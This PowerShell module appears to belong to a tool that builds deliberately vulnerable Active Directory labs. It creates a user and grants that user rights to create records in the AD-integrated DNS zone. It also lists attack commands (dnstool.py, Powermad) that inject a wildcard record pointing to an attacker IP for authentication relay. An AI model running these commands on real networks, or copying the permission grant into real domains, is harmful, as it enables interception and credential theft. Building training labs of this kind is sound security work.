#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    Deploys Active Directory Integrated DNS (ADIDNS) injection scenario.
.DESCRIPTION
    Creates a user with rights to write DNS records in the AD integrated DNS zone.
#>

function Deploy-ADIDNS {
    [CmdletBinding()]
    param(
        [string]$Difficulty = 'Medium',
        [string]$DomainDN,
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying ADIDNS Injection Scenario..." -Type Info

    $password = Get-VulnPassword -Difficulty $Difficulty -Index 3
    $user = New-VulnUser -SamAccountName 'l.freeman' -Name 'Lucas Freeman' -Password $password -DomainDN $DomainDN -Description 'Network Operations Analyst'

    # Attempt ACE delegation on MicrosoftDNS zone
    try {
        $domainNameOnly = $Domain.Split('.')[0]
        $dnsPath = "LDAP://DC=$domainNameOnly,CN=MicrosoftDNS,DC=DomainDnsZones,$DomainDN"
        if ([System.DirectoryServices.DirectoryEntry]::Exists($dnsPath)) {
            $dnsZone = [ADSI]$dnsPath
            $sid = (Get-ADUser l.freeman).SID
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, 'CreateChild', 'Allow')
            $dnsZone.ObjectSecurity.AddAccessRule($ace)
            $dnsZone.CommitChanges()
            Write-VulnStatus -Message "Granted CreateChild rights to l.freeman on ADIDNS zone." -Type Success
        } else {
            Write-VulnStatus -Message "ADIDNS zone partition path not found, skipping ACE application." -Type Warning
        }
    } catch {
        Write-VulnStatus -Message "ADIDNS ACE application: $_" -Type Warning
    }

    Write-VulnResult -Name 'ADIDNS Setup' -Detail 'l.freeman granted record creation rights on ADIDNS' -Success $true -IsLast

    return @{
        Scenario       = 'ADIDNS'
        Description    = 'User permitted to create/modify Active Directory Integrated DNS records'
        CreatedObjects = @('l.freeman')
        AttackCommands = @(
            'dnstool.py -u domain\l.freeman -p <pass> -r *.domain -a add -t A -d <attacker_ip> <dc_ip>',
            'Powermad: Invoke-DNSUpdate -DNSType A -DNSName * -DNSData <attacker_ip>'
        )
        AttackPath     = 'l.freeman -> Inject Wildcard DNS Record -> Intercept Authentication / Relay'
        MitreID        = 'T1557.001'
        Difficulty     = $Difficulty
    }
}

function Remove-ADIDNS {
    [CmdletBinding()]
    param([string]$DomainDN)

    try {
        Remove-ADUser -Identity 'l.freeman' -Confirm:$false -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Removed ADIDNS scenario objects." -Type Success
    } catch {
        Write-VulnStatus -Message "Cleanup error: $_" -Type Warning
    }
}

function Test-ADIDNS {
    [CmdletBinding()]
    param([string]$DomainDN)

    $u = Get-ADUser -Filter "samAccountName -eq 'l.freeman'" -ErrorAction SilentlyContinue
    return ($null -ne $u)
}
